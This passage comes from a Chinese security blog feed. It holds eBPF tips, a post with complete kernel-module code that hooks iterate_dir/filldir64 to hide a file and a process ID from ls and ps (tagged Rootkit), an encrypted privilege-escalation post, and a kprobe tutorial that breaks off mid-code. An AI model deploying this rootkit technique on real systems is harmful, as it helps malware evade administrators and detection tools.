title="Tips"></a>Tips</h2><ol><li><code>bpf_trace_printk</code> 函数只能打印3个参数,并且特别慢,请只用于调试,查看print的内容请执行<code>cat /sys/kernel/debug/tracing/trace_pipe</code></li><li>善用<code>clang -S</code> 输出 bpf 汇编,方便调试bpf程序,eBPF的错误提示只能说是聊胜于无</li><li>在线看源码<a href="https://elixir.bootlin.com/linux/v5.15.46/source/">点我</a>,方便本地没有内核源码的人查看内核定义</li><li>碰上不理解的多去看<code>bcc</code>和<code>ebpf</code>的示例,基本上已经把常见的eBPF类型写的很清楚了</li><li><code>bpf_helpers</code>一定要去看使用手册,搞清楚什么情况下才能用,在线浏览<a href="https://man7.org/linux/man-pages/man7/bpf-helpers.7.html">点我</a>,例如在源码里有的<code>bpf_sys_close</code> 手册上实际并没有,一定要按手册来</li><li>全部软件架构请参考<a href="https://github.com/libbpf/libbpf-bootstrap/tree/master/examples/c">libbpf-bootstrap</a>和<a href="https://github.com/cilium/ebpf/tree/master/examples">cilium&#x2F;ebpf</a></li></ol><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>eBPF作为一个新的内核扩展技术,的确可以称得上是超能力了,尤其是CO-RE,以后可以更方便的支持不同架构的机器去做内核层的数据分析,对于云原生架构也非常友好,很适合现在docker和k8s遍地开花的时代,对于安全方面, 也非常适合<code>hids</code>和<code>edr/ndr</code> 层面,期待以后eBPF技术对内核扩展更多功能吧</p>]]></content>
      
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> 内核 </tag>
            
            <tag> 安全 </tag>
            
            <tag> eBPF </tag>
            
            <tag> Go </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>实现linux内核层隐藏文件/进程</title>
      <link href="/26ba831ed3d0/"/>
      <url>/26ba831ed3d0/</url>
      
        <content type="html"><![CDATA[<style>code {    color:#0099cc;}</style><h2 id="原理介绍"><a href="#原理介绍" class="headerlink" title="原理介绍"></a>原理介绍</h2><p>由于Linux世界所有东西都是文件,包括进程,我们可以很简单的实现内核层隐藏文件&#x2F;进程,其实是一个意思</p><p>从用户层到内核层枚举进程&#x2F;文件的调用链如下:</p><p><code>opendir</code> -&gt; <code>readdir</code> -&gt; <code>syscall</code> -&gt; <code>getdents64</code> -&gt; <code>iterate_dir</code> -&gt; <code>filldir64</code></p><p><code>syscall</code>之前都是用户层调用的函数,走到内核层,其实都调用了<code>getdents64</code>包括常见命令<code>ps</code>和<code>ls</code></p><p>所以我们只需要hook<code>getdents64</code> 的低层调用<code>filldir64</code>来处理所有<code>dirent</code></p><p>❕<font color="#fe1616">注意</font>,不能直接hook<code>filldir64</code> ,因为<code>kretprobe</code>无法修改函数执行流程,不可以在函数开头就直接返回</p><p>所以我们需要在<code>iterate_dir</code>中替换<code>ctx</code>的函数指针<code>ctx-&gt;actor</code> 为我们的处理函数</p><h2 id="编码"><a href="#编码" class="headerlink" title="编码"></a>编码</h2><p>完整代码其实只有这么一点,重要的是对linux世界<code>dirent</code>和<code>inode</code>的理解,以及<code>proc</code>是如何处理自身文件系统的,如何处理系统调用</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/binfmts.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/cdev.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/delay.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/device.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/file.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/fs.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/fs_struct.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/init.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/kernel.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/kprobes.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/kthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/miscdevice.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/module.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/slab.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/uaccess.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">MODULE_LICENSE(<span class="string">&quot;Dual BSD/GPL&quot;</span>);</span><br><span class="line">MODULE_AUTHOR(<span class="string">&quot;CyberSecurity&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> DEBUG</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DBGINFO(m, ...) pr_debug(KBUILD_MODNAME <span class="string">&quot;-dbg: &quot;</span> m <span class="string">&quot;\n&quot;</span>, ##__VA_ARGS__)</span></span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DBGINFO(m, ...)</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">kretprobe</span> <span class="title">kp</span> =</span> &#123;</span><br><span class="line">    .kp.symbol_name = <span class="string">&quot;iterate_dir&quot;</span>,</span><br><span class="line">    .data_size      = PATH_MAX</span><br><span class="line"></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* kallsyms_lookup_name 已不再导出</span></span><br><span class="line"><span class="comment">使用kprobe获取,内部实际调用的还是kallsyms_lookup_name */</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> <span class="title function_">kallsyms_lookup_name</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *name)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> ptr = <span class="number">0</span>;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">kprobe</span> <span class="title">tkp</span> =</span> &#123;.symbol_name = name&#125;;</span><br><span class="line">    <span class="keyword">if</span> (register_kprobe(&amp;tkp) &lt; <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    ptr = (<span class="type">unsigned</span> <span class="type">long</span>)tkp.addr;</span><br><span class="line">    unregister_kprobe(&amp;tkp);</span><br><span class="line">    <span class="keyword">return</span> ptr;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="title function_">int</span> <span class="params">(*<span class="type">filldir64_t</span>)</span><span class="params">(<span class="keyword">struct</span> dir_context *ctx, <span class="type">const</span> <span class="type">char</span> *name, <span class="type">int</span> namlen,</span></span><br><span class="line"><span class="params">                           <span class="type">loff_t</span> offset, u64 ino, <span class="type">unsigned</span> <span class="type">int</span> d_type)</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">filldir64_t</span> filldir64 = <span class="literal">NULL</span>;</span><br><span class="line"><span class="type">static</span> <span class="type">int</span>         <span class="title function_">hook_filldir64</span><span class="params">(<span class="keyword">struct</span> dir_context *ctx, <span class="type">const</span> <span class="type">char</span> *name, <span class="type">int</span> namlen,</span></span><br><span class="line"><span class="params">                                  <span class="type">loff_t</span> offset, u64 ino, <span class="type">unsigned</span> <span class="type">int</span> d_type)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// DBGINFO(&quot;call hook_filldir64 name:%s&quot;, name);</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">strcmp</span>(name, <span class="string">&quot;test.txt&quot;</span>) == <span class="number">0</span>) <span class="comment">// 隐藏文件</span></span><br><span class="line">    &#123;</span><br><span class="line">        DBGINFO(<span class="string">&quot;hidden test.txt&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">strcmp</span>(name, <span class="string">&quot;145003&quot;</span>) == <span class="number">0</span>) <span class="comment">// 隐藏进程pid,如果需要隐藏进程名 使用 get_pid_task(pid, PIDTYPE_PID); 来获取进程结构</span></span><br><span class="line">    &#123;</span><br><span class="line">        DBGINFO(<span class="string">&quot;hidden pid 145003&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> filldir64(ctx, name, namlen, offset, ino, d_type);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">handler_pre</span><span class="params">(<span class="keyword">struct</span> kretprobe_instance *p, <span class="keyword">struct</span> pt_regs *regs)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">dir_context</span> *<span class="title">ctx</span> =</span> (<span class="keyword">struct</span> dir_context *)regs-&gt;si;</span><br><span class="line">    ctx-&gt;actor              = hook_filldir64;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">handler_post</span><span class="params">(<span class="keyword">struct</span> kretprobe_instance *ri, <span class="keyword">struct</span> pt_regs *regs)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> __init <span class="type">int</span> <span class="title function_">kprobe_init</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> ret;</span><br><span class="line">    kp.handler       = handler_post;</span><br><span class="line">    kp.entry_handler = handler_pre;</span><br><span class="line">    filldir64        = (<span class="type">filldir64_t</span>)kallsyms_lookup_name(<span class="string">&quot;filldir64&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (filldir64 == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        DBGINFO(<span class="string">&quot;filldir64 addr get failed&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> -EFAULT;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ret = register_kretprobe(&amp;kp);</span><br><span class="line">    <span class="keyword">if</span> (ret &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        DBGINFO(<span class="string">&quot;register_kprobe failed, returned %d&quot;</span>, ret);</span><br><span class="line">        <span class="keyword">return</span> ret;</span><br><span class="line">    &#125;</span><br><span class="line">    DBGINFO(<span class="string">&quot;start kprobe at %s: %p&quot;</span>, kp.kp.symbol_name, kp.kp.addr);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">static</span> __exit <span class="type">void</span> <span class="title function_">kprobe_exit</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    unregister_kretprobe(&amp;kp);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">module_init(kprobe_init);</span><br><span class="line">module_exit(kprobe_exit);</span><br></pre></td></tr></table></figure><h2 id="演示"><a href="#演示" class="headerlink" title="演示"></a>演示</h2><p>环境 Ubuntu 22.04 5.15.0-46-generic 测试通过</p><p>执行<code>ls</code>:<br><img src="/26ba831ed3d0/1.png"></p><p>执行<code>ps</code>:<br><img src="/26ba831ed3d0/2.png"></p><p>加载驱动后,成功隐藏文件<code>test.txt</code> 和 进程pid <code>145003</code><br><img src="/26ba831ed3d0/3.png"><br><img src="/26ba831ed3d0/4.png"></p><p>此时可以看到,指定文件和进程已经被隐藏,但是请❕<font color="#fe1616">注意</font>,此处并没有处理<code>openat</code>等其他系统调用,正常去读还是可以读到的,需要更隐蔽一点,还需要处理之前文章写到过的<code>openat</code>,<code>stat</code>等</p>]]></content>
      
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> 内核 </tag>
            
            <tag> Hook </tag>
            
            <tag> Rootkit </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux常用提权方法</title>
      <link href="/676206b80588/"/>
      <url>/676206b80588/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="d8abbe7895a220f235c0c40b8ec88f405b335aa3f47232802495743e520db632">803a1cceb27abaa40bf03fd0631e5335cd9a0b0ac1633e3439f76b0c398a15aabe0112516e0d2627769f31c6dc8d9fbafa042e6f9ea9e6a03fb24afd7fc45e0937c1409548cf8e72f7c7b53217b8bc24e8c0e5c53f9464b5fa3ae6c15f19bfc3fdb7056186aa4939b3361db73b23c07cb19e9f2dcb76a8dfafdc47dc20c673e58c41cec6e2ebf76876ecae019a5951aaac1edd447ebac7b13f4ee7b2934fb8a1a5341154b42147602247074145d2e9b73f86335f179aa7e90dcabd0f04cbfda7b3ba1cacb0c0d9733f861df051f25d21a92157de621c7f651477d025132c0f84cc293b3e1c34fa84f23bc3bc3d9fdbe9fa7ce9653bbe78c9973868018a343201babe4d58d5c1e60db9ea1c36e18fded26b63551ff40941e2e48ed18d8de734e12bd676a8b42e456b72d25c6f21a405183d1d7df09774169e89d3c2b2bffd2a8a2f618ab9373181dd5e39061e100dabf929ca704efc6021a190374dbb7222e26b7339f0604ef5dff30034e3d3b356a28e36092de87ad6b67cc7eb7eeef6b4bd030368b0c299c3be4b89590c0e7fc230c44e07996b976bfdd8553aabce835e5d72</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> 提权 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>使用kprobe进行linux内核下hook</title>
      <link href="/6d188cabc922/"/>
      <url>/6d188cabc922/</url>
      
        <content type="html"><![CDATA[<style>code {    color:#0099cc;}</style><h2 id="什么是kprobe"><a href="#什么是kprobe" class="headerlink" title="什么是kprobe"></a>什么是kprobe</h2><p>kprobe 可以用来跟踪内核函数中某一条指令在<code>运行前</code>和<code>运行后</code>的情况。详细了解请自行百度</p><p>除了<code>kprobe</code>,还有<code>kretprobe</code>(函数返回时触发,可修改返回值),<code>jprobe</code>(探测函数的入参值)</p><p>通俗的说,把hook点替换成<code>int 3</code>断点,CPU执行代码跑到这个位置时触发异常,内核捕获异常,达到hook目的</p><p>❕注意,内核需要开启 <code>CONFIG_KPROBES=y</code> 新版内核基本已经默认开启 本文基于内核<code>5.15.0-46-generic</code></p><h2 id="如何使用"><a href="#如何使用" class="headerlink" title="如何使用"></a>如何使用</h2><h4 id="结构定义"><a href="#结构定义" class="headerlink" title="结构定义:"></a>结构定义:</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">kprobe</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">hlist_node</span> <span class="title">hlist</span>;</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">/* list of kprobes for multi-handler support */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">list</span>;</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">/*count the number of times this probe was temporarily disarmed */</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> nmissed;</span><br><span class="line"> </span><br><span class="line"><span class="comment">/* location of the probe point */</span></span><br><span class="line"><span class="type">kprobe_opcode_t</span> *addr; <span class="comment">// hook函数的地址,需要hook中途指令才使用这个,一般都用symbol_name</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">/* Allow user to indicate symbol name of the probe point */</span></span><br><span class="line"><span class="type">const</span> <span class="type">char</span> *symbol_name; <span class="comment">//符号名 要Hook的内核函数</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">/* Offset into the symbol */</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> offset;</span><br><span class="line"> </span><br><span class="line"><span class="comment">/* Called before addr is executed. */</span></span><br><span class="line"><span class="type">kprobe_pre_handler_t</span> pre_handler; <span class="comment">//hook函数调用时触发</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">/* Called after addr is executed, unless... */</span></span><br><span class="line"><span class="type">kprobe_post_handler_t</span> post_handler; <span class="comment">//hook函数调用后触发,注意,在这里修改返回值也没用,需要用kretprobe</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * ... called if executing addr causes a fault (eg. page fault).</span></span><br><span class="line"><span class="comment"> * Return 1 if it handled fault, otherwise kernel will see it.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">kprobe_fault_handler_t</span> fault_handler; <span class="comment">//执行失败时触发</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * ... called if breakpoint trap occurs in probe handler.</span></span><br><span class="line"><span class="comment"> * Return 1 if it handled break, otherwise kernel will see it.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">kprobe_break_handler_t</span> break_handler; <span class="comment">//断点时触发</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">/* Saved opcode (which has been replaced with breakpoint) */</span></span><br><span class="line"><span class="type">kprobe_opcode_t</span> opcode; <span class="comment">//保存的hook前原始指令</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">/* copy of the original instruction */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">arch_specific_insn</span> <span class="title">ainsn</span>;</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Indicates various status flags.</span></span><br><span class="line"><span class="comment"> * Protected by kprobe_mutex after this kprobe is registered.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">u32 flags;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h4 id="关键函数"><a href="#关键函数" class="headerlink" title="关键函数:"></a>关键函数:</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">register_kprobe</span><span class="params">(<span class="keyword">struct</span> kprobe *kp)</span>      <span class="comment">//向内核注册kprobe探测点</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">unregister_kprobe</span><span class="params">(<span class="keyword">struct</span> kprobe *kp)</span>   <span class="comment">//卸载kprobe探测点</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">register_kprobes</span><span class="params">(<span class="keyword">struct</span> kprobe **kps, <span class="type">int</span> num)</span>     <span class="comment">//注册探测函数向量，包含多个探测点</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">unregister_kprobes</span><span class="params">(<span class="keyword">struct</span> kprobe **kps, <span class="type">int</span> num)</span>  <span class="comment">//卸载探测函数向量，包含多个探测点</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">disable_kprobe</span><span class="params">(<span class="keyword">struct</span> kprobe *kp)</span>       <span class="comment">//临时暂停指定探测点的探测</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">enable_kprobe</span><span class="params">(<span class="keyword">struct</span> kprobe *kp)</span>        <span class="comment">//恢复指定探测点的探测</span></span><br></pre></td></tr></table></figure><h4 id="简单演示"><a href="#简单演示" class="headerlink" title="简单演示:"></a>简单演示:</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* For each probe you need to allocate a kprobe structure */</span></span><br><span class="line"><span class="type">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">kprobe</span> <span class="title">kp</span> =</span> &#123;</span><br><span class="line">.symbol_name= <span class="string">&quot;do_fork&quot;</span>, <span class="comment">//要hook的函数名(内核函数)</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">handler_pre</span><span class="params">(<span class="keyword">struct</span> kprobe *p, <span class="keyword">struct</span> pt_regs *regs)</span></span><br><span class="line">&#123;</span><br><span class="line">    printk(KERN_INFO <span class="string">&quot;handler_pre\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">handler_post</span><span class="params">(<span class="keyword">struct</span> kprobe *p, <span class="keyword">struct</span> pt_regs *regs,</span></span><br><span class="line"><span class="params"><span class="type">unsigned</span> <span class="type">long</span> flags)</span></span><br><span class="line">&#123;</span><br><span class="line">    printk(KERN_INFO <span class="string">&quot;handler_post\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">handler_fault</span><span class="params">(<span class="keyword">struct</span> kprobe *p, <span class="keyword">struct</span> pt_regs *regs, <span class="type">int</span> trapnr)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="type">static</span> <span class="type">int</span> __init <span class="title function_">kprobe_init</span><span class="params">(<span class="type">void</span>)</span> <span class="comment">//驱动加载时执行的函数</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> ret;</span><br><span class="line">kp.pre_handler = handler_pre; <span class="comment">// 指派执行前hook函数</span></span><br><span class="line">kp.post_handler = handler_post;<span class="comment">// 指派执行后hook函数</span></span><br><span class="line">kp.fault_handler = handler_fault; <span class="comment">//指派执行失败函数</span></span><br><span class="line"> </span><br><span class="line">ret = register_kprobe(&amp;kp); <span class="comment">//注册hook,注册完成后addr应该被赋值,且返回0</span></span><br><span class="line"><span class="keyword">if</span> (ret &lt; <span class="number">0</span>) &#123;</span><br><span class="line">printk(KERN_INFO <span class="string">&quot;register_kprobe failed, returned %d\n&quot;</span>, ret);</span><br><span class="line"><span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line">printk(KERN_INFO <span class="string">&quot;Planted kprobe at %p\n&quot;</span>, kp.addr);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">static</span> <span class="type">void</span> __exit <span class="title function_">kprobe_exit</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">unregister_kprobe(&amp;kp);</span><br><span class="line">printk(KERN_INFO <span class="string">&quot;kprobe at %p unregistered\n&quot;</span>, kp.addr);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">module_init(kprobe_init)</span><br><span class="line">module_exit(kprobe_exit)</span><br><span class="line">MODULE_LICENSE(<span class="string">&quot;GPL&quot;</span>);</span><br></pre></td></tr></table></figure><p>你已经学会了内核hook了,快去写一个hids吧(不是</p><h2 id="使用kretprobe实现内核层文件保护"><a href="#使用kretprobe实现内核层文件保护" class="headerlink" title="使用kretprobe实现内核层文件保护"></a>使用kretprobe实现内核层文件保护</h2><h4 id="原理"><a href="#原理" class="headerlink" title="原理:"></a>原理:</h4><p>所有用户层程序都会使用<code>openat</code>来打开文件,走到内核层实际调用的是<code>do_sys_openat2</code>,修改<code>do_sys_openat2</code>的返回值为<code>EBADF</code>即可防止读取文件</p><h4 id="话不多说-直接上代码"><a href="#话不多说-直接上代码" class="headerlink" title="话不多说 直接上代码:"></a>话不多说 直接上代码:</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span 